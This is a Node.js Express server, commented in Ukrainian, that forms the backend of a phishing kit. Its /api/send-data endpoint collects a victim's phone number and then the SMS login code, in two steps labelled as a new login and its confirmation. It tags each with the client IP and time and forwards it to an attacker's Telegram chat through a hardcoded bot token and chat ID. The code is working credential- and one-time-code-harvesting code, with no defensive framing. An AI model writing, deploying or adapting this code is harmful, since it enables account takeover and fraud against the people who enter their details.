const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
// Використовуємо 'node-fetch' версії 2 для сумісності з 'require'
const fetch = require('node-fetch'); 

const app = express();
// Використовуємо process.env.PORT, як ви вказали для деплою
const port = process.env.PORT || 3000; 

// === КОНФІГУРАЦІЯ TELEGRAM ===
// !! ЗАМІНІТЬ ЦІ ЗНАЧЕННЯ НА ВАШІ РЕАЛЬНІ !!
const BOT_TOKEN = "7639782846:AAH75R2_5sggh42TL_pAsjNdQDDqfcZ4cSU"; 
const CHAT_ID = "-5058613889"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ==============================

// Використовуємо middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Обслуговуємо статичні файли (HTML, CSS, JS) з кореня
// Переконайтеся, що ваш HTML файл названо index.html для автоматичного обслуговування
app.use(express.static(path.join(__dirname, '/')));

/**
 * Функція для відправки повідомлення у Telegram
 * @param {string} message - Текст повідомлення
 */
async function sendToTelegram(message) {
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });

        // Перевіряємо статус відповіді
        if (!response.ok) {
            const errorData = await response.json();
            console.error('Помилка API Telegram:', response.status, errorData);
            return false;
        }

        const data = await response.json();
        return data.ok; // true, якщо успішно
    } catch (error) {
        console.error('Критична помилка відправки в Telegram:', error);
        return false;
    }
}

// API-ендпоінт для прийому даних з форми
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code } = req.body;
    let message = '';
    
    // Додаємо інформацію про IP та час для кращого логування
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const timestamp = new Date().toLocaleString('uk-UA', { timeZone: 'Europe/Kiev' });

    if (step === 'phone' && phone) {
        // КРОК 1: Телефон
        message = `🚨 **НОВИЙ ВХІД / КРОК 1**\n\n**Номер телефону:** \`${phone}\`\n**IP:** \`${clientIP}\`\n**Час:** \`${timestamp}\``;
    } else if (step === 'code' && code) {
        // КРОК 2: Код
        message = `✅ **ПІДТВЕРДЖЕННЯ / КРОК 2**\n\n**SMS-код:** \`${code}\`\n**IP:** \`${clientIP}\`\n**Час:** \`${timestamp}\``;
    } else {
        return res.status(400).json({ success: false, message: 'Неправильні або відсутні дані.' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.status(200).json({ success: true, message: 'Дані успішно відправлені.' });
    } else {
        res.status(500).json({ success: false, message: 'Помилка відправки в Telegram.' });
    }
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
